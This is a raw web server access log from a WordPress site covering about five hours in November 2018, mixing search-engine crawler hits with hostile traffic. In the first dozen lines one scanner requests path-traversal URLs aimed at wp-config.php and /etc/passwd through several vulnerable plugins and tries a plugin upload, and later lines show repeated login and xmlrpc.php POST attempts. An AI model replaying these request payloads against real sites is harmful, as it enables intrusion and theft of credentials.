45.32.79.177 - - [02/Nov/2018:22:25:38 +0000] "GET /wp-content/plugins/revslider/temp/update_extract/revslider/db.php HTTP/1.0" 404 263 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:38 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.0" 500 15 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:39 +0000] "GET /wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php HTTP/1.0" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:39 +0000] "GET /wp-content/plugins/recent-backups/download-file.php?file_link=/etc/passwd HTTP/1.0" 404 249 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:39 +0000] "GET /wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=/etc/passwd HTTP/1.0" 404 258 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:40 +0000] "GET /wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd HTTP/1.0" 404 265 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:40 +0000] "GET /wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd HTTP/1.0" 404 263 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:40 +0000] "GET /wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../../../../../etc/passwd HTTP/1.0" 404 264 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:41 +0000] "POST /wp-content/plugins/wp-symposium/server/php/index.php HTTP/1.0" 404 250 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:41 +0000] "GET /wp-content/plugins/wp-symposium/server/php/JcNaiPvhGHrJAI.php HTTP/1.0" 404 259 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:41 +0000] "POST / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
45.32.79.177 - - [02/Nov/2018:22:25:42 +0000] "POST / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32"
180.76.15.143 - - [02/Nov/2018:22:37:20 +0000] "GET /wp-includes/js/jquery/jquery-migrate.min.js HTTP/1.0" 200 10056 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.214 - - [02/Nov/2018:22:57:30 +0000] "GET /wp-content/uploads/2018/02/RadLogoVerticalRed-White.png HTTP/1.0" 200 1518775 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
31.170.123.73 - - [02/Nov/2018:23:21:21 +0000] "POST /wp-cron.php?doing_wp_cron=1541200881.1793789863586425781250 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541200881.1793789863586425781250" "WordPress/4.9.8; http://xintanalegends.com"
3.16.45.187 - - [02/Nov/2018:23:21:20 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "https://www.google.com/url?643b51bb24d9057381ea7bbb069c88c5" "Mozilla/5.0 (Windows NT 5.1; rv:29.0) Gecko/20120101 Firefox/29.0"
3.16.45.187 - - [02/Nov/2018:23:21:22 +0000] "POST /wp-login.php HTTP/1.0" 200 3290 "https://www.google.com/url?643b51bb24d9057381ea7bbb069c88c5" "Mozilla/5.0 (Windows NT 5.1; rv:29.0) Gecko/20120101 Firefox/29.0"
120.35.38.212 - - [02/Nov/2018:23:38:59 +0000] "HEAD /wp-content/themes/twentyseventeen/comments.php HTTP/1.0" 200 - "-" "-"
178.154.244.10 - - [02/Nov/2018:23:50:01 +0000] "GET /robots.txt HTTP/1.0" 404 208 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
178.154.244.10 - - [02/Nov/2018:23:50:05 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 200 1045 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
109.86.115.141 - - [03/Nov/2018:00:21:07 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "http://xintana.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
31.170.123.73 - - [03/Nov/2018:00:21:08 +0000] "POST /wp-cron.php?doing_wp_cron=1541204468.0771079063415527343750 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541204468.0771079063415527343750" "WordPress/4.9.8; http://xintanalegends.com"
109.86.115.141 - - [03/Nov/2018:00:21:07 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "http://xintanalegends.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
109.86.115.141 - - [03/Nov/2018:00:21:08 +0000] "POST /wp-login.php HTTP/1.0" 200 3257 "http://xintana.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
109.86.115.141 - - [03/Nov/2018:00:21:08 +0000] "POST /wp-login.php HTTP/1.0" 200 3257 "http://xintanalegends.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
54.36.148.170 - - [03/Nov/2018:00:29:27 +0000] "GET /wp-content/uploads/2018/02/screenshot.jpg HTTP/1.0" 200 210337 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
31.170.123.73 - - [03/Nov/2018:01:20:32 +0000] "POST /wp-cron.php?doing_wp_cron=1541208032.4780650138854980468750 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541208032.4780650138854980468750" "WordPress/4.9.8; http://xintanalegends.com"
31.184.238.11 - - [03/Nov/2018:01:20:32 +0000] "GET /wp-login.php?action=register HTTP/1.0" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36"
31.184.238.11 - - [03/Nov/2018:01:20:33 +0000] "GET /wp-login.php?registration=disabled HTTP/1.0" 200 2433 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36"
89.248.169.130 - - [03/Nov/2018:01:49:11 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
89.248.169.130 - - [03/Nov/2018:01:49:11 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
89.248.169.130 - - [03/Nov/2018:01:49:12 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
89.248.169.130 - - [03/Nov/2018:01:49:13 +0000] "POST /xmlrpc.php HTTP/1.0" 200 403 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
163.172.54.35 - - [03/Nov/2018:01:54:17 +0000] "GET / HTTP/1.0" 200 59953 "-" "-"
163.172.54.35 - - [03/Nov/2018:01:54:17 +0000] "GET /robots.txt HTTP/1.0" 404 208 "-" "-"
163.172.54.35 - - [03/Nov/2018:01:54:17 +0000] "GET /sitemap.xml HTTP/1.0" 404 209 "-" "-"
185.86.164.101 - - [03/Nov/2018:02:00:31 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.164.101 - - [03/Nov/2018:02:00:31 +0000] "POST /wp-login.php HTTP/1.0" 200 2559 "http://xintana.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.164.101 - - [03/Nov/2018:02:00:32 +0000] "POST /wp-login.php HTTP/1.0" 200 3239 "http://xintana.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
31.170.123.73 - - [03/Nov/2018:02:29:34 +0000] "POST /wp-cron.php?doing_wp_cron=1541212174.4031059741973876953125 HTTP/1.0" 200 - "http://xintanalegends.com/wp-cron.php?doing_wp_cron=1541212174.4031059741973876953125" "WordPress/4.9.8; http://xintanalegends.com"
52.173.241.248 - - [03/Nov/2018:02:29:34 +0000] "GET / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
52.165.166.139 - - [03/Nov/2018:02:36:21 +0000] "GET / HTTP/1.0" 200 59951 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
162.243.168.240 - - [03/Nov/2018:02:39:10 +0000] "GET /?feed=rss2 HTTP/1.0" 200 16915 "-" "Faraday v0.9.1"
185.86.164.98 - - [03/Nov/2018:02:53:16 +0000] "GET /wp-login.php HTTP/1.0" 200 2291 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.86.164.98 - - [03/Nov/2018:02:53:16 +0000] "POST /wp-login.php HTTP/1.0" 200 3239 "http://xintanalegends.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
